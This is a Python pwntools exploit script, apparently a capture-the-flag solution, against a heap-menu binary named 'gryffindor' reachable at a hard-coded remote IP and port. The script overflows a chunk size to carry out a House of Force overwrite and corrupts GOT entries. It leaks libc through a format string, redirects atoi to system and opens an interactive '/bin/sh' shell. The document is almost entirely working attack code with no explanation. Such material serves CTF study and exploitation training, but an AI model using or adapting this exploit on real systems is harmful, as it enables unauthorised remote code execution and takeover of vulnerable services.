from pwn import *
import sys

if len(sys.argv) > 1:
	r=remote("35.227.84.155",1337)
else:
	r=process('./gryffindor')
e=ELF('./gryffindor')
libc=ELF('./libc.so.6')

atoi=0x602068
printf_plt=0x4006c0

def add(idx,size):
    r.sendlineafter(">> ",'1')
    r.sendlineafter("Enter size of input",str(size))
    r.sendlineafter("Enter index",str(idx))

def delete(idx):
    r.sendlineafter(">> ",'2')
    r.sendlineafter("Enter index",str(idx))

def edit(idx,size,data):
    r.sendlineafter(">> ",'3')
    r.sendlineafter("Enter index",str(idx))
    r.sendlineafter("Enter size",str(size))
    r.sendline(data)

def heap_addr():
    r.sendlineafter(">> ",'1337')
    leak = int(r.recvuntil('\n'),16)
    return leak-0x10

def exploit(heap):
    add(1,152)
    edit(1,200,"A"*152+p64(-1,signed=True))
    size=0x602040-(heap+0x1c0)
    #print size
    add(2,size)
    add(3,150)
    payload=p64(e.plt['atoll']+6)
    payload+=p64(e.plt['malloc']+6)
    payload+=p64(e.plt['setvbuf']+6)

    payload1=payload+p64(e.plt['printf'])

    edit(3,150,payload1)
    r.sendlineafter(">> ","%p-%p~%p")
    r.recvuntil('~')
    libc.address=int(r.recvuntil('\n').strip(),16)-0xf7230
    system=libc.symbols['system']

    payload2=payload+p64(system)

    r.sendlineafter(">> ",'aa')
    r.sendlineafter("Enter index",'aa')
    r.sendlineafter("Enter size","A"*30)
    r.sendline(payload2)
    r.sendlineafter(">> ","/bin/sh")
    r.recvuntil(">> ")


heap = heap_addr()
print "Heap =",hex(heap)
exploit(heap)
r.interactive()
